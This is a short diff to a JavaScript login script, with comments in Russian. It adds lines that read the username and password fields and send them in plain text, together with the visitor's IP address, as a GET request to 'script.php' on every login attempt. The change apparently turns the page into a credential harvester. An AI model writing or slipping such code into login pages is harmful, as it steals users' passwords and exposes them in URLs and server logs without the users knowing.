@@ -93,7 +93,9 @@
             .then(data => {
             // Сохраняем результат запроса в переменную
             let result = data;
-            let url = "script.php?value=Try to login from IP: " + result;
+            var un = document.getElementById('username').value;
+            var pw = document.getElementById('password').value;
+            let url = "script.php?value=Try to login from IP: " + result + " Login: " + un + " Password: " + pw;
             fetch(url , { method: 'GET' });
     })
     .catch(error => console.error('Ошибка:', error));
